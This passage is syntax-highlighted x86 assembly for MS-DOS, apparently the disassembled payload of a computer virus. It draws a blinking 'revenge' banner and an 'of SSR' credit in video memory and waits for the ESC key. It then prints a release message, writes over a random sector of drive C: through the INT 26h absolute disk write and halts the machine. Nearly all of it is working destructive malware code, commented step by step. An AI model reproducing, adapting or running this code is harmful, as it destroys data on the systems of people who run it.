                                </span><span class="sc1">; CL bits 0-4 = end line in character cell</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0B800h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; ES:=video memory segment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">80</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">; gotoxy(28,3)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">this_is</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">write_this_is</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; End of string?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">wrote_this_is</span><span class="sc0">   </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">      </span><span class="sc1">; Write char to screen</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">; 2 chars between letters</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">write_this_is</span><span class="sc0">

</span><span class="sc5">wrote_this_is</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">80</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; gotoxy(0,6)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">revenge</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">           </span><span class="sc1">; 12 lines</span><span class="sc0">
</span><span class="sc5">l_revenge_line</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; End of line?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">new_revenge_line</span><span class="sc0">        </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">          </span><span class="sc1">; Space?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmp_b1</span><span class="sc0">          </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Color: black</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">write_charAL_colorAH</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">cmp_b1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'±'</span><span class="sc0">          </span><span class="sc1">; ± code?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmp126</span><span class="sc0">          </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">         </span><span class="sc1">; Blink ±</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">write_charAL_colorAH</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">cmp126</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc0">          </span><span class="sc1">; ~ code?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmpp</span><span class="sc0">            </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">code126p</span><span class="sc0">

</span><span class="sc5">cmpp</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc0">          </span><span class="sc1">; '#' code?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmp_d</span><span class="sc0">           </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">code126p</span><span class="sc0">

</span><span class="sc5">cmp_d</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc0">          </span><span class="sc1">; 'd' code?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmp_w</span><span class="sc0">           </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">         </span><span class="sc1">; Blink</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'±'</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">write_2chars</span><span class="sc0">

</span><span class="sc5">cmp_w</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc0">          </span><span class="sc1">; 'w' code?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmpadm</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Color: red</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'ß'</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">write_2chars</span><span class="sc0">

</span><span class="sc5">cmpadm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc0">          </span><span class="sc1">; '!' code?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_special_char</span><span class="sc0"> </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Char 0, color black</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">write_2chars</span><span class="sc0">

</span><span class="sc5">no_special_char</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Color: red</span><span class="sc0">
</span><span class="sc5">write_charAL_colorAH</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l_revenge_line</span><span class="sc0">

</span><span class="sc5">new_revenge_line</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; Next screen line</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_revenge_line</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc2">20</span><span class="sc4">*</span><span class="sc2">80</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">; gotoxy(6,20)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">of_SSR</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">write_of_SSR</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; End of string?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">wrote_of_SSR</span><span class="sc0">    </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">      </span><span class="sc1">; Write char to screen</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">; 2 chars between letters</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">write_of_SSR</span><span class="sc0">

</span><span class="sc5">wrote_of_SSR</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200</span><span class="sc0">          </span><span class="sc1">; !?</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0"> 
</span><span class="sc5">change_line_colors</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc2">20</span><span class="sc4">*</span><span class="sc2">80</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">; gotoxy(20,5)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">68</span><span class="sc0">
</span><span class="sc5">l_set_colors</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">; Calculate color</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Black?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_black</span><span class="sc0">        </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Skip black</span><span class="sc0">
</span><span class="sc5">no_black</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">    </span><span class="sc1">; Set char color</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Next char</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_set_colors</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delay</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; New colors</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">          </span><span class="sc1">; AT Keyboard controller 8042.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; ESC key pressed?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">change_line_colors</span><span class="sc0">      </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">print_msg_and_kill_sector</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">delay</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">code126p</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Number of chars to repeat</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">codep</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">                     </span><span class="sc1">; '~' char</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Color: Black</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l_repeat_char</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">codep</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">         </span><span class="sc1">; Blink</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'±'</span><span class="sc0">
</span><span class="sc5">l_repeat_char</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; More chars?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">end_repeat_char</span><span class="sc0"> </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Write char</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l_repeat_char</span><span class="sc0">

</span><span class="sc5">end_repeat_char</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l_revenge_line</span><span class="sc0">

</span><span class="sc5">write_2chars</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Write char</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">write_charAL_colorAH</span><span class="sc0">    </span><span class="sc1">; Write another char</span><span class="sc0">

</span><span class="sc5">print_msg_and_kill_sector</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">             </span><span class="sc1">; VIDEO: Change mode to 80x25 B&amp;W</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">             </span><span class="sc1">; VIDEO: Change mode to 80x25 16col.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2000h</span><span class="sc0">        </span><span class="sc1">; Invisible cursor</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">             </span><span class="sc1">; VIDEO: Set cursor characteristics</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">80</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">; gotoxy(8,9)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">release_msg</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0B800h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Point to video memory</span><span class="sc0">
</span><span class="sc5">l_print_version</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">print_string</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; Next screen line</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Next line (inc cx!!)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; 4 lines printed?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">l_print_version</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; ES:=40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">6Ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Random sector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; 1 sector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; C:</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">26h</span><span class="sc0">             </span><span class="sc1">; DOS - ABSOLUTE DISK WRITE</span><span class="sc0">
                                        </span><span class="sc1">; AL = drive number (0=A, 1=B, etc),</span><span class="sc0">
                                        </span><span class="sc1">; DS:BX = Disk Transfer Address (buffer)</span><span class="sc0">
                                        </span><span class="sc1">; CX = number of sectors to write,</span><span class="sc0">
                                        </span><span class="sc1">; DX = first relative sector to write</span><span class="sc0">
                                        </span><span class="sc1">;  Overwrite random sector</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0"> 
                </span><span class="sc6">hlt</span><span class="sc0">                     </span><span class="sc1">; Hang computer</span><span class="sc0">

</span><span class="sc5">print_string</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">; Line 1: color 11 -&gt; blue</span><span class="sc0">
                                        </span><span class="sc1">; Line 2: color 12 -&gt; red</span><span class="sc0">
                                        </span><span class="sc1">; Line 3: color 13 -&gt; pink</span><span class="sc0">
                                        </span><span class="sc1">; Line 4: color 14 -&gt; yellow</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc0">          </span><span class="sc1">; Special code?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skip_chars</span><span class="sc0">      </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; End of string?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">end_print_string</span><span class="sc0">        </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Print char</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
